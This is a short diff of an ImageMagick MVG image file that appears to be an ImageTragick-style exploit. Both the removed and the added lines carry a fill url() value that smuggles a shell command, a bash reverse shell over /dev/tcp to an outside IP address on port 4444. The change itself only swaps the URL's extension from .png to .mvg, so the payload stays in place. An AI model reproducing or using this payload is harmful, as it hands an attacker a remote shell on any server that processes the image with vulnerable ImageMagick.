@@ -1,4 +1,4 @@
 push graphic-context
 viewbox 0 0 640 480
-fill 'url(https://janetcohen.github.io/poc3/avatar.png"|bash -c "bash -i >& /dev/tcp/35.187.225.117/4444 0>&1")'
+fill 'url(https://janetcohen.github.io/poc3/avatar.mvg"|bash -c "bash -i >& /dev/tcp/35.187.225.117/4444 0>&1")'
 pop graphic-context
